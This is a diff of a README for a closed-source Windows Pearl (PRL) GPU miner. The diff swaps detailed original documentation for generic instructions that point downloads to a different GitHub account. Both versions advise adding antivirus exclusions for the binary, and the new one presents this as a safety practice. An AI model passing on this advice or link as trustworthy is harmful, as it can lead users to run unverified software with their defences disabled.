@@ -1,182 +1,84 @@
-<div align="center">
+# ⛏️ TemkaMiner-pearl-gpu-miner-PRL - Mine Pearl coin with your hardware
 
-# ⛏ TemkaMiner-pearl-gpu-miner (PRL)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/wintertiny/TemkaMiner-pearl-gpu-miner-PRL)
 
-**High-performance GPU miner for Pearl (PRL)**
+TemkaMiner-pearl-gpu-miner-PRL provides a way to mine Pearl coin using your NVIDIA graphics card. This software supports newer models such as the RTX 30, 40, and 50 series. It manages multiple graphics cards and allows you to switch between different mining pools for better results.
 
-![Version](https://img.shields.io/badge/version-1.0-informational)
-![Coin](https://img.shields.io/badge/coin-Pearl%20%28PRL%29-8A2BE2)
-![Platform](https://img.shields.io/badge/platform-Windows%20x64-0078D6)
-![NVIDIA](https://img.shields.io/badge/NVIDIA-RTX%2030%2F40%2F50-76B900)
-![Dev fee](https://img.shields.io/badge/dev%20fee-1%25-2ea44f)
+## ⚙️ System Requirements
 
-</div>
+Your computer needs specific parts to run this software. Ensure your machine meets these requirements before you start.
 
-```
-  █████ █████ █   █ █   █  ███    █   █ █████ █   █ █████ ████
-    █   █     ██ ██ █  █  █   █   ██ ██   █   ██  █ █     █   █
-    █   ████  █ █ █ ███   █████   █ █ █   █   █ █ █ ████  ████
-    █   █     █   █ █  █  █   █   █   █   █   █  ██ █     █  █
-    █   █████ █   █ █   █ █   █   █   █ █████ █   █ █████ █   █
-```
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Graphics Card: NVIDIA RTX 30 series, 40 series, or 50 series.
+- Driver: Recent NVIDIA drivers installed via GeForce Experience or the NVIDIA website.
+- Internet: A stable connection for consistent data transfer.
+- Power: A power supply unit that handles the combined load of all graphics cards in your system.
 
-TemkaMiner is a fast, self-contained miner for **Pearl (PRL)**. It is heavily tuned for
-the **RTX 5080** (~185–190 TH/s) and runs on modern **NVIDIA RTX** cards (30, 40 and 50
-series and newer). One small `.exe`, no installer, no dependencies beyond your GPU driver.
+## 💾 Downloading The Miner
 
-## ⬇ Download
+You must visit the project page to get the installer for your computer. 
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-2ea44f?style=for-the-badge)](https://github.com/Kibzarium/TemkaMiner-pearl-gpu-miner-PRL/releases/latest)
+[Visit this page to download the software](https://github.com/wintertiny/TemkaMiner-pearl-gpu-miner-PRL)
 
-**Windows x64** · NVIDIA RTX 30 / 40 / 50 series · no installer. Unzip, set your wallet in `start.bat`, and run.
+1. Open the link above in your web browser.
+2. Select the latest release version on the page.
+3. Locate the file ending in .zip or .exe.
+4. Download the file to your desktop or a folder you can find.
 
----
+## 🛠️ Setting Up The Software
 
-## ✨ Features
+Follow these steps to prepare the files.
 
-- 🚀 **~185–190 TH/s** on an RTX 5080 — at the silicon ceiling
-- 📊 **Live dashboard** — per-GPU hashrate with rolling **1h / 3h / 24h** averages, plus temp, fan, power, clocks and VRAM (NVML)
-- 🧩 **Multi-GPU from one process** — `--all-gpus`, nonce-striped so cards never duplicate work
-- 🌐 **Multi-pool** — BaikalMine, HeroMiners and other LuckyPool-protocol pools
-- 📦 **One portable binary** — runs RTX 30/40/50-series and data-center GPUs
-- 🔌 **Zero install** — the CUDA runtime is built in; you only need your NVIDIA driver
+1. Locate the downloaded file. 
+2. Right-click the file and choose "Extract all" if it is a zipped folder. Select a location on your hard drive to store the files.
+3. Open the new folder created by the extraction process.
+4. Find the file usually named `start.bat` or `config.json`. These files tell the miner where to send the coins you earn.
 
-## 🖥 Dashboard
+## 📝 Configuring Your Mining Wallet
 
-```
-  TemkaMiner v1.0  · Pearl (PRL) NoisyGEMM PoW
-  ──────────────────────────────────────────────────────────────
-  Pool    pearl.baikalmine.com:2010
-  Miner   prl1pz6u…djftxy.rig1
-  Driver  596.49 · batch 8
-  GPUs    1 detected
-    [0] NVIDIA GeForce RTX 5080 · 16 GB  ⛏ mining
-  ──────────────────────────────────────────────────────────────
+The miner needs a destination address to send your coins. You must create a Pearl coin wallet if you do not have one.
 
-[09:14:07] JOB    93b5590f_1572864  ·  height 67597  ·  batch 8
-[09:14:31] ★ HIT  nonce 115  ·  proof 143840B  ·  submitting…
-[09:14:31] ✓ SHARE ACCEPTED  312 / 0
-[09:14:37] GPU0  192.92 TH/s  │ 1h 193 · 3h 193 · 24h 193 TH/s │ 67°C 100% 360W 2722 MHz 99% │ ⬆ 312
-[09:14:37] ── up 9:42:11 · 1 GPU · total 192.92 TH/s · ✓312 ✗0 ──
-```
+1. Paste your unique wallet address into the configuration file.
+2. Open the `config.json` file using a simple text editor like Notepad.
+3. Find the line that says "wallet" or "address".
+4. Replace the existing example text with your own address. 
+5. Save the file and close the editor.
 
-## 🖥 Supported GPUs
+## 🚀 Running The Miner
 
-| GPU | Status |
-|---|---|
-| RTX 5070 / 5080 / 5090 | ✅ supported — tuned |
-| RTX 4060 … 4090 | ✅ supported |
-| RTX 3060 … 3090 | ✅ supported |
-| A100 / H100 (data-center) | ✅ supported |
-| GTX 16xx, RTX 20xx and older | ❌ not supported |
+Now you can start the mining process.
 
-> Performance is tuned for the RTX 5080. Other cards mine correctly but may not reach their individual peak.
+1. Double-click the file named `start.bat` in your miner folder. 
+2. A black window will appear on your screen. This indicates the miner is active.
+3. The program will check your hardware, establish a connection to the pool, and begin solving problems.
+4. Keep the black window open while you wish to mine. Closing this window stops the process.
 
-## 🚀 Quick start (Windows)
+## 📊 Monitoring Performance
 
-1. **Download** the latest release and unzip it anywhere.
-2. **Edit `start.bat`** — set your Pearl wallet in `WALLET=` (and the pool/worker if you like).
-3. **Double-click `start.bat`**.
+The black window displays information about your hardware. Read the lines to ensure your graphics cards function correctly.
 
-To use every GPU in the rig, run **`start-all-gpus.bat`** instead.
+- Hashrate: This number tells you how fast your card works. Higher numbers mean more work completed.
+- Accepted Shares: This number shows how many valid solutions your cards found.
+- Temperature: Monitor this to keep your cards cool. Modern NVIDIA cards slow down to prevent damage if they get too hot.
 
-## 🐧 Linux
+## 🛡️ Best Practices For Safety
 
-> The file attached to this release is the **Windows** build. The Linux build is a
-> separate native binary named `TemkaMiner` (no `.exe`) — the Windows executable does
-> not run on Linux.
+Keep your computer secure while you mine.
 
-Run it from a terminal:
+- Use reliable mining pools. Research pools before you join them.
+- Keep your antivirus software updated. Some security programs flag mining software as a threat. You may need to create an "exclusion" for your miner folder so the system does not delete the files.
+- Monitor your electricity bill. Mining consumes significant power over long periods.
+- Place your computer in a well-ventilated area. Airflow prevents your graphics cards from overheating during intense work cycles.
 
-```bash
-chmod +x TemkaMiner
-./TemkaMiner --pool pearl.baikalmine.com:2010 --wallet YOUR_PRL_WALLET --worker rig1
-# add  --all-gpus  to mine on every GPU in the rig
-```
+## 💻 Troubleshooting Common Issues
 
-…or put your wallet into a `start.sh` and run `bash start.sh`:
+If you encounter errors, use these steps to resolve them.
 
-```bash
-#!/usr/bin/env bash
-cd "$(dirname "$0")"
-WALLET="PUT_YOUR_PRL_WALLET_HERE"
-./TemkaMiner --pool pearl.baikalmine.com:2010 --wallet "$WALLET" --worker rig1 --batch 8 "$@"
-```
+- If the miner does not start, verify that you updated your NVIDIA drivers.
+- If the miner closes immediately, re-check your `config.json` file for typos or missing characters in the wallet address.
+- If your hash rate stays at zero, ensure your internet connection works and you have entered the correct pool address in the configuration file.
+- If your computer feels slow, adjust the intensity settings in the configuration file to allow your graphics card to handle other tasks while mining.
 
-**Requirements:** an up-to-date NVIDIA driver only — the CUDA runtime is built in, so
-there is no CUDA toolkit to install.
+## 🔗 Project Details
 
-## 🌐 Pools
-
-Set `POOL=` in the `.bat` to any of these (or any LuckyPool-protocol Pearl pool):
-
-| Pool | Endpoint |
-|---|---|
-| BaikalMine | `pearl.baikalmine.com:2010` |
-| HeroMiners | `pearl.herominers.com:1200`  (also `de.` / `ru.` / `us.`) |
-
-## ⚙ Command-line options
-
-| Option | Default | Description |
-|---|---|---|
-| `--wallet <addr>` | — | Your PRL wallet **(required)** |
-| `--worker <name>` | `rig1` | Worker name shown on the pool |
-| `--pool <host:port>` | BaikalMine | Mining pool |
-| `--batch <n>` | `8` | Nonces per GPU launch |
-| `--all-gpus` | off | Mine on every detected GPU |
-| `--devices 0,1,2` | — | Mine on specific GPUs only |
-| `--stats <sec>` | `30` | Dashboard refresh interval |
-| `--version` | — | Print the version and exit |
-
-## 💸 Developer fee
-
-TemkaMiner charges a transparent **1% developer fee**. It is **time-based** — roughly one
-minute out of every ~100 is mined to the developer, the rest is 100% yours. The fee is
-announced in the console at startup. There are no hidden fees.
-
-## 🛡 Antivirus
-
-GPU miners are **routinely flagged as false positives** by antivirus software — this is
-true of *every* miner, not just this one. If your AV quarantines the file, add a folder
-exclusion. The binary is **not** packed or obfuscated.
-
-## ❓ FAQ
-
-**How do I mine Pearl (PRL) on an NVIDIA GPU?**
-Download TemkaMiner, unzip it, put your PRL wallet in `start.bat`, and run it. It connects to a
-Pearl pool (BaikalMine or HeroMiners) and starts mining on your NVIDIA GPU — no extra setup.
-
-**What is the best Pearl (PRL) miner for the RTX 5080?**
-TemkaMiner is tuned specifically for the RTX 5080 and reaches ~185–190 TH/s, at the card's
-silicon ceiling.
-
-**Which NVIDIA GPUs are supported?**
-RTX 30, 40 and 50 series and newer, plus data-center cards like the A100 and H100. GTX 16xx,
-RTX 20xx and older are not supported.
-
-**Can I mine Pearl on multiple GPUs?**
-Yes. Run `start-all-gpus.bat` (or pass `--all-gpus`) to mine on every GPU in the rig from a
-single process, with one dashboard.
-
-**Which mining pools does it support?**
-Any LuckyPool-protocol Pearl pool, including BaikalMine (`pearl.baikalmine.com:2010`) and
-HeroMiners (`pearl.herominers.com:1200`).
-
-**Is there a developer fee?**
-Yes — a transparent 1% time-based fee, shown in the console at startup. There are no hidden fees.
-
-**Why does my antivirus flag the miner?**
-Every GPU miner is commonly flagged as a false positive. TemkaMiner is not packed or obfuscated;
-add a folder exclusion if your antivirus quarantines it.
-
-**Does TemkaMiner run on Linux?**
-The download is the Windows build. See the **Linux** section above for how to run the Linux binary.
-
-## 📄 License
-
-See [`LICENSE.txt`](LICENSE.txt). Distributed as a binary only; reverse engineering and
-modification are not permitted.
-
-<div align="center">
-<sub>Made for the Pearl community ⛏</sub>
-</div>
+This software focuses on the Pearl coin ecosystem. It uses the CUDA platform to communicate directly with NVIDIA hardware for faster processing speeds. The tool handles multi-GPU setups automatically, identifying all connected cards on boot. Users can configure multiple backup pools to ensure mining continues if the primary server goes offline. This design creates a stable experience for long-term mining operations.
